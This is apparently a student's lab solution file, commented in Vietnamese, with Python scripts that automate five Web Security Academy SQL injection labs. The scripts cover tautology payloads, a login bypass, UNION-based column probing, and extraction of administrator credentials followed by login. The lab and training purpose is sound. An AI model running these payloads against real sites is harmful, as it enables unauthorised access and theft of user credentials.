# Mục lục
- [Lab 1](https://github.com/toanvunee/Training-KCSC/blob/main/Task-1/solveLabByPython.md#lab-1-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data)
- [Lab 2](https://github.com/toanvunee/Training-KCSC/blob/main/Task-1/solveLabByPython.md#lab-2-sql-injection-vulnerability-allowing-login-bypass)
- [Lab 3](https://github.com/toanvunee/Training-KCSC/blob/main/Task-1/solveLabByPython.md#lab-3-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query)
- [Lab 4](https://github.com/toanvunee/Training-KCSC/blob/main/Task-1/solveLabByPython.md#lab-4-sql-injection-union-attack-finding-a-column-containing-text)
- [Lab 5](https://github.com/toanvunee/Training-KCSC/edit/main/Task-1/solveLabByPython.md#lab-5-sql-injection-union-attack-retrieving-data-from-other-tables)


# LAB 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

```python
import requests
print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")
target_url = f"{url}/filter?category=Gifts'+OR+1=1+--"

response = requests.get(target_url)
if (response.status_code == 200):
    print("Successful")
else:
    print("Failed")
```

# LAB 2: SQL injection vulnerability allowing login bypass
- Em không có hiểu cái cách lấy CSRF nên e dùng chatGPT để làm cái đoạn đó ạ 🥲
```python
import requests
from bs4 import BeautifulSoup

url = input("Nhập URL: ").rstrip("/")
login_url = f"{url}/login"

session = requests.Session()
response = session.get(login_url)

if response.status_code != 200:
    print(f"Không thể truy cập {login_url}, mã lỗi: {response.status_code}")
    exit()

soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf_token,
    "username": "admin' OR 1=1--",
    "password": "a"
}

response = session.post(login_url, data=data)
print(f"Request sent to: {login_url}")
if (response.status_code == 200):
    print("Login successful!")
else:
    print("Login failed!")
```

# LAB 3: SQL injection UNION attack, determining the number of columns returned by the query
```python
import requests

print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")


i = 1
while True:
    order_url = f"{url}/filter?category=Gifts'+ORDER+BY+{i}+--"
    response = requests.get(order_url)

    if response.status_code == 200:
        i += 1  
    else:
        i -= 1  
        break

null_values = ",+".join(["NULL"] * i)
union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+{null_values}--"

print(f"Payload UNION: {union_url}")
response = requests.get(union_url)

if (response.status_code == 200):
    print("Successful")
else:
    print("Failed")
```

# LAB 4: SQL injection UNION attack, finding a column containing text
```python
import requests

print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")
print("Ví dụ: Giá trị được lab cung cấp: aNjdF")
value = input("Giá trị được lab cung cấp: ")

i = 1
while True:
    order_url = f"{url}/filter?category=Gifts'+ORDER+BY+{i}+--"
    response = requests.get(order_url)

    if response.status_code == 200:
        i += 1  
    else:
        i -= 1  
        break

for pos in range(i):
    test_values = ["NULL"] * i  
    test_values[pos] = f"'{value}'"  

    null_values = ",+".join(test_values)
    union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+{null_values}--"
    
    print(f"Thử payload: {union_url}")
    response = requests.get(union_url)
    
    if response.status_code == 200:
        print("Successful")
        break 
```

# LAB 5: SQL injection UNION attack, retrieving data from other tables
```python
import requests
from bs4 import BeautifulSoup

print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")

union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+username,+password+FROM+users--"

response = requests.get(union_url)

if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    table_rows = soup.find_all("tr")

    password_found = None
    for row in table_rows:
        th = row.find("th")
        td = row.find("td")
        if th and td and th.text.strip() == "administrator":
            password_found = td.text.strip()
            break

    if password_found:
        print(f"Tìm thấy password của administrator: {password_found}")
    else:
        print("Không tìm thấy password của administrator.")
        exit()

login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)

soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password_found
}

response = session.post(login_url, data=data)

if "Welcome" in response.text or response.status_code == 200:
    print("Thành công!")
```
